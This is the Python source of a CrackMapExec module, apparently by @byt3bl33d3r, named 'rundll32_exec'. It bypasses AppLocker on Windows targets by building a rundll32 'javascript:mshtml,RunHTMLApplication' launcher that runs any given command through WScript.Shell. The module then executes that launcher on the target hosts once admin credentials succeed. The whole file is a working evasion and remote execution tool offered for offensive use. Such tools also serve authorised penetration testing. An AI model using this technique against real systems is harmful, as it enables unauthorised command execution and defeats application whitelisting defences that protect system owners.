class CMEModule:
    '''
        AppLocker bypass using rundll32 and Windows native javascript interpreter
        Module by @byt3bl33d3r

    '''

    name = 'rundll32_exec'

    description = 'Executes a command using rundll32 and Windows\'s native javascript interpreter'

    #If the module supports chaining, change this to True
    chain_support = True

    def options(self, context, module_options):
        '''
            COMMAND  Command to execute on the target system(s) (Required if CMDFILE isn't specified)
            CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
        '''

        if not 'COMMAND' in module_options and not 'CMDFILE' in module_options:
            context.log.error('COMMAND or CMDFILE options are required!')
            exit(1)

        if 'COMMAND' in module_options and 'CMDFILE' in module_options:
            context.log.error('COMMAND and CMDFILE are mutually exclusive!')
            exit(1)

        if 'COMMAND' in module_options:
            self.command = module_options['COMMAND']

        elif 'CMDFILE' in module_options:
            path = os.path.expanduser(module_options['CMDFILE'])

            if not os.path.exists(path):
                context.log.error('Path to CMDFILE invalid!')
                exit(1)

            with open(path, 'r') as cmdfile:
                self.command = cmdfile.read().strip()

    def launcher(self, context, command):
        command = command.replace('\\', '\\\\')
        command = command.replace('"', '\\"')
        command = command.replace("'", "\\'")

        launcher = 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("{}");'.format(command)
        return launcher

    def payload(self, context, command):
        return

    def on_admin_login(self, context, connection, launcher, payload):
        connection.execute(launcher)
        context.log.success('Executed command')